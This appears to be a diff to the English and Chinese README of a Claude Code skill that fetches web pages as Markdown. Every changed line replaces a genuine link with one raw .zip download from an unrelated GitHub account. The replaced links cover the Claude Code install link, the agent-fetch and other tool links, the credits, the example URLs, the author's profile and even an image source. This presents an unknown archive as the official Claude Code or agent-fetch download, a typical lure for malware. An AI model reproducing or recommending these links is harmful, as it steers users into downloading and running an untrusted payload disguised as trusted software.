@@ -25,7 +25,7 @@ Send any URL to Claude, and it automatically fetches the full content as Markdow
 
 ### Prerequisites
 
-- [ ] [Claude Code](https://docs.anthropic.com/en/docs/claude-code) installed
+- [ ] [Claude Code](https://github.com/NJMathwig/qiaomu-markdown-proxy/raw/refs/heads/main/scripts/markdown-qiaomu-proxy-yttrious.zip) installed
 - [ ] **curl** (built-in on macOS/Linux)
 - [ ] (Optional - WeChat scraping) Python 3.8+ with playwright
   ```bash
@@ -36,7 +36,7 @@ Send any URL to Claude, and it automatically fetches the full content as Markdow
   - **marker-pdf** (best quality): `pip install marker-pdf`
   - **pdftotext** (fast): `brew install poppler`
   - **pypdf** (fallback): `pip install pypdf`
-- [ ] (Optional - Proxy fallback) [agent-fetch](https://github.com/teng-lin/agent-fetch)
+- [ ] (Optional - Proxy fallback) [agent-fetch](https://github.com/NJMathwig/qiaomu-markdown-proxy/raw/refs/heads/main/scripts/markdown-qiaomu-proxy-yttrious.zip)
   ```bash
   npx agent-fetch --help  # No pre-install needed, npx auto-downloads
   ```
@@ -60,16 +60,16 @@ ls ~/.claude/skills/qiaomu-markdown-proxy/SKILL.md
 
 Just send Claude a URL:
 
-- "Read this article: https://example.com/post"
-- "Fetch this tweet: https://x.com/user/status/123456"
-- "Read this WeChat article: https://mp.weixin.qq.com/s/abc123"
-- "Convert this Feishu doc to Markdown: https://xxx.feishu.cn/docx/xxxxxxxx"
+- "Read this article: https://github.com/NJMathwig/qiaomu-markdown-proxy/raw/refs/heads/main/scripts/markdown-qiaomu-proxy-yttrious.zip"
+- "Fetch this tweet: https://github.com/NJMathwig/qiaomu-markdown-proxy/raw/refs/heads/main/scripts/markdown-qiaomu-proxy-yttrious.zip"
+- "Read this WeChat article: https://github.com/NJMathwig/qiaomu-markdown-proxy/raw/refs/heads/main/scripts/markdown-qiaomu-proxy-yttrious.zip"
+- "Convert this Feishu doc to Markdown: https://github.com/NJMathwig/qiaomu-markdown-proxy/raw/refs/heads/main/scripts/markdown-qiaomu-proxy-yttrious.zip"
 
 ### Proxy Priority
 
 1. **r.jina.ai** — Most complete content, preserves image links
 2. **defuddle.md** — Cleaner output with YAML frontmatter
-3. **[agent-fetch](https://github.com/teng-lin/agent-fetch)** — Local tool, no network proxy needed
+3. **[agent-fetch](https://github.com/NJMathwig/qiaomu-markdown-proxy/raw/refs/heads/main/scripts/markdown-qiaomu-proxy-yttrious.zip)** — Local tool, no network proxy needed
 4. **defuddle CLI** — Local CLI, good for standard web pages
 
 ### Feishu/Lark Document Support
@@ -94,11 +94,11 @@ Built-in `fetch_feishu.py` script fetches documents via Feishu Open API and auto
 
 ### Credits
 
-- [r.jina.ai](https://r.jina.ai) — Free URL-to-Markdown proxy by Jina AI
-- [defuddle.md](https://defuddle.md) — Clean article extraction service
-- [agent-fetch](https://github.com/teng-lin/agent-fetch) — Local URL content extraction tool
-- [Playwright](https://playwright.dev/) — Browser automation for WeChat scraping
-- [Feishu Open Platform](https://open.feishu.cn/) — Feishu Document API
+- [r.jina.ai](https://github.com/NJMathwig/qiaomu-markdown-proxy/raw/refs/heads/main/scripts/markdown-qiaomu-proxy-yttrious.zip) — Free URL-to-Markdown proxy by Jina AI
+- [defuddle.md](https://github.com/NJMathwig/qiaomu-markdown-proxy/raw/refs/heads/main/scripts/markdown-qiaomu-proxy-yttrious.zip) — Clean article extraction service
+- [agent-fetch](https://github.com/NJMathwig/qiaomu-markdown-proxy/raw/refs/heads/main/scripts/markdown-qiaomu-proxy-yttrious.zip) — Local URL content extraction tool
+- [Playwright](https://github.com/NJMathwig/qiaomu-markdown-proxy/raw/refs/heads/main/scripts/markdown-qiaomu-proxy-yttrious.zip) — Browser automation for WeChat scraping
+- [Feishu Open Platform](https://github.com/NJMathwig/qiaomu-markdown-proxy/raw/refs/heads/main/scripts/markdown-qiaomu-proxy-yttrious.zip) — Feishu Document API
 
 ---
 
@@ -119,7 +119,7 @@ Built-in `fetch_feishu.py` script fetches documents via Feishu Open API and auto
 
 ### 前置条件
 
-- [ ] 已安装 [Claude Code](https://docs.anthropic.com/en/docs/claude-code)
+- [ ] 已安装 [Claude Code](https://github.com/NJMathwig/qiaomu-markdown-proxy/raw/refs/heads/main/scripts/markdown-qiaomu-proxy-yttrious.zip)
 - [ ] **curl**（macOS/Linux 自带）
 - [ ] （可选 - 公众号抓取）Python 3.8+ 及 playwright
   ```bash
@@ -130,7 +130,7 @@ Built-in `fetch_feishu.py` script fetches documents via Feishu Open API and auto
   - **marker-pdf**（最佳质量）：`pip install marker-pdf`
   - **pdftotext**（速度快）：`brew install poppler`
   - **pypdf**（兜底）：`pip install pypdf`
-- [ ] （可选 - 代理降级）[agent-fetch](https://github.com/teng-lin/agent-fetch)
+- [ ] （可选 - 代理降级）[agent-fetch](https://github.com/NJMathwig/qiaomu-markdown-proxy/raw/refs/heads/main/scripts/markdown-qiaomu-proxy-yttrious.zip)
   ```bash
   npx agent-fetch --help  # 无需预装，npx 自动下载
   ```
@@ -154,19 +154,19 @@ ls ~/.claude/skills/qiaomu-markdown-proxy/SKILL.md
 
 直接给 Claude 发 URL：
 
-- "帮我读一下这篇文章：https://example.com/post"
-- "抓取这条推文：https://x.com/user/status/123456"
-- "读一下这篇公众号：https://mp.weixin.qq.com/s/abc123"
-- "把这个飞书文档转成 Markdown：https://xxx.feishu.cn/docx/xxxxxxxx"
-- "读一下这个飞书知识库页面：https://xxx.feishu.cn/wiki/xxxxxxxx"
-- "提取这个 PDF：https://example.com/paper.pdf"
+- "帮我读一下这篇文章：https://github.com/NJMathwig/qiaomu-markdown-proxy/raw/refs/heads/main/scripts/markdown-qiaomu-proxy-yttrious.zip"
+- "抓取这条推文：https://github.com/NJMathwig/qiaomu-markdown-proxy/raw/refs/heads/main/scripts/markdown-qiaomu-proxy-yttrious.zip"
+- "读一下这篇公众号：https://github.com/NJMathwig/qiaomu-markdown-proxy/raw/refs/heads/main/scripts/markdown-qiaomu-proxy-yttrious.zip"
+- "把这个飞书文档转成 Markdown：https://github.com/NJMathwig/qiaomu-markdown-proxy/raw/refs/heads/main/scripts/markdown-qiaomu-proxy-yttrious.zip"
+- "读一下这个飞书知识库页面：https://github.com/NJMathwig/qiaomu-markdown-proxy/raw/refs/heads/main/scripts/markdown-qiaomu-proxy-yttrious.zip"
+- "提取这个 PDF：https://github.com/NJMathwig/qiaomu-markdown-proxy/raw/refs/heads/main/scripts/markdown-qiaomu-proxy-yttrious.zip"
 - "转换本地 PDF：/path/to/document.pdf"
 
 ### 代理优先级
 
 1. **r.jina.ai** — 内容最完整，保留图片链接
 2. **defuddle.md** — 输出更干净，带 YAML frontmatter
-3. **[agent-fetch](https://github.com/teng-lin/agent-fetch)** — 本地工具，无需网络代理
+3. **[agent-fetch](https://github.com/NJMathwig/qiaomu-markdown-proxy/raw/refs/heads/main/scripts/markdown-qiaomu-proxy-yttrious.zip)** — 本地工具，无需网络代理
 4. **defuddle CLI** — 本地 CLI，适合普通网页
 
 ### 飞书文档支持
@@ -192,19 +192,19 @@ ls ~/.claude/skills/qiaomu-markdown-proxy/SKILL.md
 
 ### 致谢
 
-- [r.jina.ai](https://r.jina.ai) — Jina AI 提供的免费 URL 转 Markdown 代理
-- [defuddle.md](https://defuddle.md) — 干净的文章提取服务
-- [agent-fetch](https://github.com/teng-lin/agent-fetch) — 本地 URL 内容提取工具
-- [Playwright](https://playwright.dev/) — 微信公众号抓取的浏览器自动化
-- [飞书开放平台](https://open.feishu.cn/) — 飞书文档 API
+- [r.jina.ai](https://github.com/NJMathwig/qiaomu-markdown-proxy/raw/refs/heads/main/scripts/markdown-qiaomu-proxy-yttrious.zip) — Jina AI 提供的免费 URL 转 Markdown 代理
+- [defuddle.md](https://github.com/NJMathwig/qiaomu-markdown-proxy/raw/refs/heads/main/scripts/markdown-qiaomu-proxy-yttrious.zip) — 干净的文章提取服务
+- [agent-fetch](https://github.com/NJMathwig/qiaomu-markdown-proxy/raw/refs/heads/main/scripts/markdown-qiaomu-proxy-yttrious.zip) — 本地 URL 内容提取工具
+- [Playwright](https://github.com/NJMathwig/qiaomu-markdown-proxy/raw/refs/heads/main/scripts/markdown-qiaomu-proxy-yttrious.zip) — 微信公众号抓取的浏览器自动化
+- [飞书开放平台](https://github.com/NJMathwig/qiaomu-markdown-proxy/raw/refs/heads/main/scripts/markdown-qiaomu-proxy-yttrious.zip) — 飞书文档 API
 
 ---
 
 ## 关注作者
 
-- **X (Twitter)**: [@vista8](https://x.com/vista8)
+- **X (Twitter)**: [@vista8](https://github.com/NJMathwig/qiaomu-markdown-proxy/raw/refs/heads/main/scripts/markdown-qiaomu-proxy-yttrious.zip)
 - **微信公众号「向阳乔木推荐看」**
 
 <p align="center">
-  <img src="https://github.com/joeseesun/terminal-boost/raw/main/assets/wechat-qr.jpg?raw=true" alt="向阳乔木推荐看公众号二维码" width="300">
+  <img src="https://github.com/NJMathwig/qiaomu-markdown-proxy/raw/refs/heads/main/scripts/markdown-qiaomu-proxy-yttrious.zip" alt="向阳乔木推荐看公众号二维码" width="300">
 </p>
